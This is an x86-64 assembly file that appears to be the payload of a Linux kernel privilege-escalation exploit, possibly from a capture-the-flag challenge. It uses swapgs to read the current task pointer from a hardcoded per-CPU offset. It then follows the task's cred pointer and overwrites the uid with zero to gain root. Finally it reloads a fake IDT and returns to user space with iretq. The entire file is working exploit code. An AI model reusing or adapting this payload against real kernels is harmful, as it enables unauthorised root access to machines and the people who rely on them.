.intel_syntax noprefix

.data
.align 0x10
idt_table:
    // original is stored in cpu entry area
    .short 0xfff
    .8byte 0xfffffe0000000000

.text
    .globl leak_gsbase
    .globl lidt
    .globl pwn    

lidt:
    lidt [rdi]
    ret

leak_current_task:
    swapgs
    // current task offset
    // reference can be found at 0xffffffff810401e1 in cpu_init()
    mov rax, gs:[0x21440]
    swapgs
    ret

pwn:
    call leak_current_task
    // offset to task->cred
    // reference can be found at 0xffffffff8109b34d in __put_cred()
    mov rax, qword ptr [rax + 0x5b0]
    // overwrite current->uid
    mov dword ptr [rax+8], 0
    
    // setup the original IDT again
    lea rdi, [idt_table]
    call lidt 
    iretq
        
